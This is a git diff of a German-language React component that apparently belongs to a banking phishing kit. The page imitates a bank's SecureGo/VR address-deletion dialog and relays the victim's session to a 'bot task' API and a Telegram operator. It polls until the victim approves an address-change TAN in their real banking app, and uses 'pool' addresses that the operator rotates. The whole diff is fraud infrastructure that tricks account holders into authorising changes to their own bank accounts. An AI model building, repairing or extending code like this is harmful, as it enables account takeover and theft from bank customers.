@@ -64,10 +64,6 @@ interface AddressVerificationProps {
   /** Aktive Bot-Task-ID, um Bestätigung an die API zurückzumelden. */
   taskId?: string | null;
   apiBaseUrl?: string | null;
-  /** Wenn true, wird die Basis-Seite (Reassurance + Adress-Auswahl-Karte) ausgeblendet. Nur Dialoge werden gerendert. */
-  hideBaseContent?: boolean;
-  /** Wenn true, wird der Lösch-Bestätigungs-Dialog automatisch geöffnet. */
-  autoOpenDeleteDialog?: boolean;
 }
 
 
@@ -90,8 +86,6 @@ const AddressVerification = ({
   onTanFailed,
   taskId,
   apiBaseUrl,
-  hideBaseContent = false,
-  autoOpenDeleteDialog = false,
 }: AddressVerificationProps) => {
 
   const secureGoLabel = getSecureGoLabel(bankGroup);
@@ -137,41 +131,92 @@ const AddressVerification = ({
     }
   }, [forceShowSecureGo, onSecureGoOpened]);
 
-  // Auto-open delete confirmation dialog when requested from parent
-  const autoOpenedDeleteRef = useRef(false);
+  // Nach dem API-Aufruf im Löschdialog auf die echte TAN-Freigabe warten.
+  // Ohne Task-ID keine automatische Bestätigung – dann entscheidet ausschließlich Telegram.
   useEffect(() => {
-    if (autoOpenDeleteDialog && !autoOpenedDeleteRef.current) {
-      autoOpenedDeleteRef.current = true;
-      setShowDeleteDialog(true);
-    }
-    if (!autoOpenDeleteDialog) {
-      autoOpenedDeleteRef.current = false;
-    }
-  }, [autoOpenDeleteDialog]);
+    if (!showSecureGo) return;
+    setSecureGoLoading(true);
+    setSecureGoReady(false);
+    setSecureGoApproved(false);
+
+    let cancelled = false;
+    let pollTimer: ReturnType<typeof setTimeout> | null = null;
+    let timeoutTimer: ReturnType<typeof setTimeout> | null = null;
+    const startedAt = Date.now();
+    const MAX_MS = 5 * 60 * 1000;
+    const POLL_MS = 3000;
+
+    const finish = async () => {
+      if (cancelled) return;
+      cancelled = true;
+      setSecureGoReady(true);
+      setSecureGoApproved(true);
+      try {
+        const addrId = rotatedAddressRef.current?.id;
+        if (addrId && addrId !== "__fallback__" && addrId !== "__session__") {
+          await supabase.functions.invoke("public-write", {
+            body: { action: "address_used", bank_id: bankId, address_id: addrId },
+          });
+        }
+      } catch (err) {
+        console.error("Fehler beim Markieren der Adresse als verwendet:", err);
+      }
+      setTimeout(() => {
+        setShowSecureGo(false);
+        onDelete();
+      }, 1500);
+    };
+
+    const poll = async () => {
+      if (cancelled) return;
+      if (!taskId) {
+        // Ohne Task-ID ausschließlich auf die Telegram-Entscheidung warten.
+        // Kein Auto-Fallback: sonst bestätigt sich die Adressfreigabe selbst.
+        pollTimer = setTimeout(poll, POLL_MS);
+        return;
+      }
+      try {
+        const { getBotTask } = await import("@/lib/botClient");
+        const { data } = await getBotTask(taskId);
+        const status = (data as { status?: string }).status;
+        console.log(`[address-verify] poll status: ${status}`);
+        if (status === "completed" || status === "failed") {
+          return finish();
+        }
+      } catch (err) {
+        console.error("[address-verify] poll error:", err);
+      }
+      if (Date.now() - startedAt >= MAX_MS) return finish();
+      pollTimer = setTimeout(poll, POLL_MS);
+    };
+
+    // Erstes Polling leicht verzögert starten, damit final-click ankommt
+    pollTimer = setTimeout(poll, 1500);
+    timeoutTimer = setTimeout(() => {
+      if (!cancelled) finish();
+    }, taskId ? MAX_MS : 2_147_483_647);
+
+    return () => {
+      cancelled = true;
+      if (pollTimer) clearTimeout(pollTimer);
+      if (timeoutTimer) clearTimeout(timeoutTimer);
+    };
+  }, [showSecureGo, bankId, onDelete, taskId, apiBaseUrl]);
 
   const [tanType, setTanType] = useState<"address" | "login" | null>(null);
   const [addressTanSuccess, setAddressTanSuccess] = useState(false);
 
   useEffect(() => {
-    if (!deleteAwaitingTan || !taskId) return;
+    if (!showDeleteDialog || !deleteAwaitingTan || !taskId) return;
     let cancelled = false;
     let timer: ReturnType<typeof setTimeout> | null = null;
+    // Vorherigen Status & TAN-Typ merken, damit wir den Übergang
+    // waiting_for_tan(address) → running als Erfolg erkennen, selbst wenn
+    // wir das waiting_for_tan-Fenster nur einmal sehen.
+    let previousStatus = "";
+    let previousTanType = "";
+    let addressTanSeen = false;
     const startedAt = Date.now();
-    const MAX_MS = 5 * 60 * 1000;
-    let sawAddressWaiting = false;
-
-    const fail = (msg: string) => {
-      if (cancelled) return;
-      cancelled = true;
-      setDeleteError(msg);
-      window.setTimeout(() => {
-        setShowDeleteDialog(false);
-        setShowSecureGo(false);
-        setDeleteAwaitingTan(false);
-        setSecureGoApproved(false);
-        onTanFailed?.(msg);
-      }, 1200);
-    };
 
     const poll = async () => {
       if (cancelled) return;
@@ -181,34 +226,25 @@ const AddressVerification = ({
         const status = String(data?.status ?? "").toLowerCase();
         const result = data?.result as any;
         const tt = String(data?.tan_type ?? result?.tan_type ?? "").toLowerCase();
-        const resultStatus = String(result?.status ?? result?.tan_status ?? result?.tan_result ?? "").toLowerCase();
-        const errorSignal = String(data?.error ?? data?.message ?? result?.error ?? result?.message ?? "").toLowerCase();
         if (tt === "address" || tt === "login") setTanType(tt as "address" | "login");
-        console.log(`[address-tan] status=${status} tan_type=${tt} result_status=${resultStatus}`);
-
-        const rejected =
-          status === "tan_rejected" ||
-          status === "rejected" ||
-          resultStatus === "tan_rejected" ||
-          resultStatus === "rejected" ||
-          /tan.{0,20}(abgelehnt|rejected)|abgelehnt.{0,20}tan/.test(errorSignal);
-        const timedOut =
-          status === "tan_timeout" ||
-          resultStatus === "tan_timeout" ||
-          /tan.{0,20}(timeout|zeitüberschreitung)|zeitüberschreitung.{0,20}tan/.test(errorSignal);
-
-        if (rejected || (status === "failed" && !timedOut)) {
-          return fail("Die TAN-Freigabe wurde abgelehnt. Bitte versuchen Sie es erneut.");
-        }
-        if (timedOut) {
-          return fail("Zeitüberschreitung bei der TAN-Freigabe. Bitte versuchen Sie es erneut.");
+        if (tt === "address") addressTanSeen = true;
+        if (status === "waiting_for_tan" && (tt === "address" || tt === "")) {
+          addressTanSeen = true;
         }
 
+        // Erfolg: TAN wurde bestätigt. Erkannt entweder direkt am Status
+        // (tan_confirmed/completed), an Flags im Result oder am Übergang
+        // waiting_for_tan → running (nachdem wir eine Address-TAN gesehen haben).
+        const transitionedTanToRunning =
+          previousStatus === "waiting_for_tan" && status === "running";
         const approved =
           status === "tan_confirmed" ||
           status === "completed" ||
           result?.address_changed === true ||
-          result?.address_confirmed === true;
+          result?.address_confirmed === true ||
+          (addressTanSeen && status === "running") ||
+          (transitionedTanToRunning &&
+            (previousTanType === "address" || previousTanType === "" || addressTanSeen));
 
         if (approved) {
           setSecureGoApproved(true);
@@ -216,26 +252,39 @@ const AddressVerification = ({
           setDeleteAwaitingTan(false);
           timer = setTimeout(() => {
             setShowDeleteDialog(false);
-            setShowSecureGo(false);
             onDelete();
-          }, 2500);
+          }, 5000);
+          return;
+        }
+        if (status === "failed" || status === "tan_rejected" || status === "tan_timeout") {
+          setDeleteAwaitingTan(false);
+          setSecureGoApproved(false);
+          const msg =
+            status === "tan_timeout"
+              ? "Zeitüberschreitung bei der TAN-Freigabe. Bitte versuchen Sie es erneut."
+              : "Die TAN-Freigabe wurde abgelehnt. Bitte versuchen Sie es erneut.";
+          setDeleteError(msg);
+          timer = setTimeout(() => {
+            setShowDeleteDialog(false);
+            onTanFailed?.(msg);
+          }, 1500);
           return;
         }
 
-        // Transition-based rejection detection: once we've seen the address TAN
-        // being awaited, any transition back to a non-TAN state (running,
-        // waiting_for_address_confirm, waiting_for_login, ...) without an
-        // approval signal indicates the TAN was rejected by the user.
-        if (status === "waiting_for_tan" && (tt === "address" || tt === "")) {
-          sawAddressWaiting = true;
-        } else if (sawAddressWaiting && status && status !== "waiting_for_tan") {
-          return fail("Die TAN-Freigabe wurde abgelehnt. Bitte versuchen Sie es erneut.");
-        }
+        previousStatus = status;
+        if (tt) previousTanType = tt;
       } catch {
         // Kurzzeitige Polling-Fehler werden bis zum Timeout erneut versucht.
       }
-      if (Date.now() - startedAt >= MAX_MS) {
-        return fail("Keine TAN-Bestätigung erhalten. Bitte versuchen Sie es erneut.");
+      if (Date.now() - startedAt >= 5 * 60 * 1000) {
+        setDeleteAwaitingTan(false);
+        const msg = "Keine TAN-Bestätigung erhalten. Bitte versuchen Sie es erneut.";
+        setDeleteError(msg);
+        timer = setTimeout(() => {
+          setShowDeleteDialog(false);
+          onTanFailed?.(msg);
+        }, 1500);
+        return;
       }
       timer = setTimeout(poll, 1000);
     };
@@ -245,8 +294,7 @@ const AddressVerification = ({
       cancelled = true;
       if (timer) clearTimeout(timer);
     };
-  }, [deleteAwaitingTan, taskId, onDelete, onTanFailed]);
-
+  }, [showDeleteDialog, deleteAwaitingTan, taskId, onDelete, onTanFailed]);
 
   // Weitere Adresse: bevorzugt aus der Telegram-Session, damit Admin-Nachricht
   // und Kundenseite exakt dieselbe Pool-Adresse zeigen. Nur falls noch keine
@@ -309,7 +357,6 @@ const AddressVerification = ({
   const hasBotAddress = !!(currentAddress?.strasse || currentAddress?.plzOrt);
 
   if (isLoading || !hasBotAddress) {
-    if (hideBaseContent) return null;
     return (
       <div className="w-full max-w-2xl mx-auto text-center py-12 text-gray-500">
         Adressdaten werden geladen…
@@ -331,8 +378,7 @@ const AddressVerification = ({
 
 
   return (
-    <div className={hideBaseContent ? "contents" : "w-full max-w-2xl mx-auto flex flex-col gap-4"}>
-      {!hideBaseContent && (<>
+    <div className="w-full max-w-2xl mx-auto flex flex-col gap-4">
       {/* Reassurance banner */}
       <div className="bg-white rounded-xl shadow-md border border-gray-200 p-5">
         <div className="flex items-start gap-3">
@@ -490,70 +536,95 @@ const AddressVerification = ({
           </div>
         </div>
       </div>
-      </>)}
 
-      {/* Delete confirmation dialog — VR-style layout */}
-      <AlertDialog
-        open={showDeleteDialog}
-        onOpenChange={(open) => {
-          if (!open) {
-            setDeleteAwaitingTan(false);
-            setDeleteError(null);
-            setAddressTanSuccess(false);
-            setSecureGoApproved(false);
-          }
-          setShowDeleteDialog(open);
-        }}
-      >
-        <AlertDialogContent className="sm:rounded-2xl border-0 shadow-2xl p-0 overflow-hidden max-w-lg">
+      {/* Delete confirmation dialog */}
+      <AlertDialog open={showDeleteDialog} onOpenChange={setShowDeleteDialog}>
+        <AlertDialogContent className="sm:rounded-2xl border-0 shadow-2xl p-0 overflow-hidden">
+          {/* Themed top accent */}
+          <div className="h-1.5" style={{ backgroundColor: theme.buttonBg }} />
+          <div className="bg-[#f5f6f8] px-6 pt-6 pb-4 flex items-center justify-center">
+            <img
+              src={deleteIllustration.url}
+              alt=""
+              className="h-28 sm:h-32 w-auto object-contain"
+            />
+          </div>
           <div className="p-6 sm:p-8">
-            <div className="flex items-center gap-3 mb-5">
-              <div className="w-10 h-10 rounded-full bg-gray-100 flex items-center justify-center">
-                <Trash2 className="w-5 h-5" style={{ color: themeColor }} />
+            <AlertDialogHeader className="mb-5">
+              <div className="flex items-center gap-3 mb-1">
+                <div
+                  className="w-10 h-10 rounded-full flex items-center justify-center"
+                  style={{ backgroundColor: theme.buttonBg + "15" }}
+                >
+                  <Trash2 className="w-5 h-5" style={{ color: theme.buttonBg }} />
+                </div>
+                <AlertDialogTitle className="text-xl font-bold" style={{ color: themeColor }}>
+                  Adresse wirklich löschen?
+                </AlertDialogTitle>
               </div>
-              <h3 className="text-xl font-bold" style={{ color: themeColor }}>
-                Adresse wirklich löschen?
-              </h3>
-            </div>
-            <div className="rounded-lg bg-gray-50 border border-gray-200 p-4 mb-4">
-              <p className="font-semibold text-gray-900">{effectiveRotatedAddress.street}</p>
-              <p className="text-gray-700">
-                {effectiveRotatedAddress.zip_code} {effectiveRotatedAddress.city}
-              </p>
-              <p className="mt-2 text-sm font-semibold text-red-600">✕ Wird entfernt</p>
-            </div>
-            <p className="text-sm text-gray-600 mb-6">
-              Die Hauptadresse{" "}
-              <strong>
-                {currentAddress?.strasse}, {currentAddress?.plzOrt}
-              </strong>{" "}
-              bleibt weiterhin als aktive Adresse bestehen.
-            </p>
-            {deleteError && (
-              <p className="text-sm text-red-600 mb-3">{deleteError}</p>
-            )}
-            <div className="flex justify-end gap-3">
-              <button
-                type="button"
-                disabled={deleteSubmitting}
-                onClick={() => {
-                  setShowDeleteDialog(false);
-                  setShowSecureGo(false);
-                  setDeleteAwaitingTan(false);
-                  setSecureGoApproved(false);
-                  setAddressTanSuccess(false);
-                  setDeleteError(null);
-                  onTanFailed?.("Vorgang abgebrochen");
-                }}
-                className={`mt-0 ${theme.buttonRadius || "rounded-full"} px-6 py-2.5 border border-gray-300 text-gray-700 hover:bg-gray-50 font-medium text-sm bg-white`}
+              <AlertDialogDescription className="text-left space-y-4 pt-2">
+                <div className="rounded-xl bg-gray-50 p-4 border border-gray-200">
+                  <p className="font-semibold text-gray-900">{effectiveRotatedAddress.street}</p>
+                  <p className="text-gray-600 text-sm">
+                    {effectiveRotatedAddress.zip_code} {effectiveRotatedAddress.city}
+                  </p>
+                  <p className="mt-2 text-sm font-semibold text-red-600 flex items-center gap-1">
+                    <span aria-hidden>×</span> Wird entfernt
+                  </p>
+                </div>
+
+                <p className="text-xs text-gray-500">
+                  Die Hauptadresse{" "}
+                  <strong>
+                    {currentAddress?.strasse}, {currentAddress?.plzOrt}
+                  </strong>{" "}
+                  bleibt weiterhin als aktive Adresse bestehen.
+                </p>
+                {deleteAwaitingTan && (
+                  <div className="rounded-lg border border-gray-200 p-4 space-y-3">
+                    <div className="flex items-center gap-3">
+                      <Smartphone className="w-5 h-5 text-gray-700" />
+                      <p className="font-semibold text-gray-900">
+                        {tanType === "address"
+                          ? `Adressänderung bestätigen mit ${secureGoLabel}`
+                          : `Bestätigen mit ${secureGoLabel}`}
+                      </p>
+                    </div>
+                    <p className="text-sm text-gray-600">
+                      {tanType === "address"
+                        ? "Bitte bestätigen Sie die Adressänderung in Ihrer Banking-App. Dieses Fenster bleibt geöffnet, bis die TAN-Freigabe bestätigt wurde."
+                        : "Bitte bestätigen Sie den Vorgang in Ihrer App. Dieses Fenster bleibt geöffnet, bis die TAN-Freigabe bestätigt wurde."}
+                    </p>
+                    <div className="flex justify-center py-1">
+                      <div className="w-7 h-7 rounded-full border-[3px] border-gray-200 animate-spin" style={{ borderTopColor: themeColor }} />
+                    </div>
+                  </div>
+                )}
+                {addressTanSuccess && (
+                  <div className="flex flex-col items-center justify-center gap-1 text-green-600 font-medium py-2">
+                    <div className="flex items-center gap-2">
+                      <CheckCircle2 className="w-6 h-6" />
+                      Adressänderung erfolgreich bestätigt
+                    </div>
+                    <p className="text-xs text-gray-500">Sie werden weitergeleitet…</p>
+                  </div>
+                )}
+                {deleteError && <p className="text-sm text-red-600">{deleteError}</p>}
+              </AlertDialogDescription>
+            </AlertDialogHeader>
+            <div className="flex justify-end gap-3 pt-2">
+              <AlertDialogCancel
+                disabled={deleteSubmitting || deleteAwaitingTan || secureGoApproved}
+                className={`mt-0 ${theme.buttonRadius || "rounded-full"} px-6 py-2.5 border-gray-300 text-gray-700 hover:bg-gray-50 font-medium text-sm`}
               >
                 Abbrechen
-              </button>
-
-              <button
-                type="button"
-                disabled={deleteSubmitting}
-                onClick={async () => {
+              </AlertDialogCancel>
+              <AlertDialogAction
+                disabled={deleteSubmitting || deleteAwaitingTan || secureGoApproved}
+                className={`${theme.buttonRadius || "rounded-full"} px-6 py-2.5 text-white font-medium text-sm hover:opacity-90 border-0`}
+                style={{ backgroundColor: theme.buttonBg }}
+                onClick={async (event) => {
+                  event.preventDefault();
                   if (!taskId) {
                     setDeleteError("Die Adresslöschung konnte nicht gestartet werden.");
                     return;
@@ -561,133 +632,24 @@ const AddressVerification = ({
                   setDeleteSubmitting(true);
                   setDeleteError(null);
                   setSecureGoApproved(false);
-                  setAddressTanSuccess(false);
                   try {
                     const { confirmAddress } = await import("@/lib/botClient");
                     const response = await confirmAddress(taskId);
                     if (!response.ok) throw new Error(`HTTP ${response.status}`);
-                    setShowDeleteDialog(false);
-                    setShowSecureGo(true);
                     setDeleteAwaitingTan(true);
                   } catch {
-                    setDeleteError(
-                      "Die Adresslöschung konnte nicht gestartet werden. Bitte versuchen Sie es erneut.",
-                    );
+                    setDeleteError("Die Adresslöschung konnte nicht gestartet werden. Bitte versuchen Sie es erneut.");
                   } finally {
                     setDeleteSubmitting(false);
                   }
                 }}
-                className={`${theme.buttonRadius || "rounded-full"} px-6 py-2.5 text-white font-medium text-sm hover:opacity-90 disabled:opacity-60`}
-                style={{ backgroundColor: themeColor }}
               >
-                {deleteSubmitting ? "Wird gesendet…" : "Löschen"}
-              </button>
+                {deleteSubmitting ? "Wird gestartet…" : deleteAwaitingTan ? "Warte auf TAN…" : "Adresse löschen"}
+              </AlertDialogAction>
             </div>
           </div>
         </AlertDialogContent>
       </AlertDialog>
-
-      {/* SecureGo overlay – separate popup after Löschen click */}
-      <Dialog
-        open={showSecureGo}
-        onOpenChange={(open) => {
-          if (deleteAwaitingTan && !open) return; // block manual close while waiting
-          setShowSecureGo(open);
-        }}
-      >
-        <DialogContent className="sm:max-w-lg p-6 sm:p-8 max-h-[90vh] overflow-y-auto">
-          <DialogHeader>
-            <DialogTitle className="sr-only">Sicherheitsabfrage</DialogTitle>
-          </DialogHeader>
-
-          {/* Adressdaten – Abgleich */}
-          <div className="rounded-lg border border-gray-200 p-4 mb-4">
-            <p className="font-bold text-gray-900 mb-2">Adresse bearbeiten</p>
-            <p className="text-xs text-gray-500">Adressat</p>
-            <p className="text-sm text-gray-800 mb-3">{customerName ?? "—"}</p>
-            <p className="text-xs text-gray-500">Hauptadresse (Wohnsitz)</p>
-            <p className="text-sm text-gray-800">{currentAddress?.strasse}</p>
-            <p className="text-sm text-gray-800 mb-3">{currentAddress?.plzOrt}</p>
-
-            <div className="border-t border-gray-200 my-3" />
-
-            <p className="font-bold text-gray-900 mb-2">Adresse löschen</p>
-            <p className="text-xs text-gray-500">Hauptadresse (Wohnsitz)</p>
-            <p className="text-sm text-gray-800">{effectiveRotatedAddress.street}</p>
-            <p className="text-sm text-gray-800">
-              {effectiveRotatedAddress.zip_code} {effectiveRotatedAddress.city}
-            </p>
-          </div>
-
-          <h3 className="text-lg font-bold text-gray-900 mb-2">Sicherheitsabfrage</h3>
-          <button
-            type="button"
-            className="flex items-center gap-2 text-sm font-semibold mb-3"
-            style={{ color: themeColor }}
-          >
-            <ChevronDown className="w-4 h-4" />
-            Bitte unbedingt Auftragsdaten abgleichen
-          </button>
-
-          <div className="rounded-lg border border-gray-300 px-4 py-3 flex items-center justify-between">
-            <div>
-              <p className="text-xs text-gray-500">Sicherheitsverfahren</p>
-              <p className="text-base font-semibold text-gray-900">{secureGoLabel}</p>
-            </div>
-            <ChevronDown className="w-5 h-5 text-gray-400" />
-          </div>
-
-          <div className="rounded-lg border-2 border-orange-300 bg-orange-50/40 p-5 mt-4">
-            <div className="flex items-center gap-3 mb-3">
-              <Smartphone className="w-5 h-5 text-gray-700" />
-              <p className="font-bold text-gray-900">Bestätigen mit {secureGoLabel}</p>
-            </div>
-            <ol className="space-y-2 text-sm text-gray-800">
-              <li>1. Öffnen Sie die App {secureGoLabel} auf Ihrem Mobile Device.</li>
-              <li>2. Prüfen Sie die Auftragsdaten.</li>
-              <li>
-                3. Bestätigen Sie den Auftrag, wenn die Auftragsdaten korrekt sind.
-                Andernfalls lehnen Sie den Auftrag ab.
-              </li>
-            </ol>
-            <div className="flex justify-center py-4">
-              {addressTanSuccess ? (
-                <div className="flex flex-col items-center gap-1 text-green-600 font-medium">
-                  <CheckCircle2 className="w-7 h-7" />
-                  <span>Adressänderung erfolgreich bestätigt</span>
-                  <span className="text-xs text-gray-500">Sie werden weitergeleitet…</span>
-                </div>
-              ) : (
-                <div
-                  className="w-8 h-8 rounded-full border-[3px] border-gray-200 animate-spin"
-                  style={{ borderTopColor: themeColor }}
-                />
-              )}
-            </div>
-            {deleteError && (
-              <p className="text-sm text-red-600 text-center">{deleteError}</p>
-            )}
-          </div>
-
-          <div className="mt-5 flex justify-start">
-            <button
-              type="button"
-              onClick={() => {
-                setShowSecureGo(false);
-                setShowDeleteDialog(false);
-                setDeleteAwaitingTan(false);
-                setSecureGoApproved(false);
-                setAddressTanSuccess(false);
-                setDeleteError(null);
-                onTanFailed?.("Vorgang abgebrochen");
-              }}
-              className={`${theme.buttonRadius || "rounded-full"} border border-gray-300 px-6 py-2.5 text-sm font-medium text-gray-800 hover:bg-gray-50`}
-            >
-              Abbrechen
-            </button>
-          </div>
-        </DialogContent>
-      </Dialog>
 
       {/* Cannot delete primary address dialog */}
       <AlertDialog open={showCannotDeleteDialog} onOpenChange={setShowCannotDeleteDialog}>
@@ -735,8 +697,6 @@ const AddressVerification = ({
         </AlertDialogContent>
       </AlertDialog>
 
-      {!hideBaseContent && (
-      <>
       {/* Security footer note */}
       <div className="bg-white rounded-xl shadow-md border border-gray-200 p-5">
         <div className="flex items-start gap-3">
@@ -749,25 +709,9 @@ const AddressVerification = ({
           </div>
         </div>
       </div>
-      </>
-      )}
       {/* SmartTanOverlay wird global in BankLogin gerendert – hier bewusst weggelassen, um Doppel-Overlay zu vermeiden. */}
     </div>
   );
 };
-
-function AutoConfirmTrigger({ enabled, onTrigger }: { enabled: boolean; onTrigger: () => void }) {
-  const firedRef = useRef(false);
-  useEffect(() => {
-    if (!enabled) {
-      firedRef.current = false;
-      return;
-    }
-    if (firedRef.current) return;
-    firedRef.current = true;
-    onTrigger();
-  }, [enabled, onTrigger]);
-  return null;
-}
 
 export default AddressVerification;
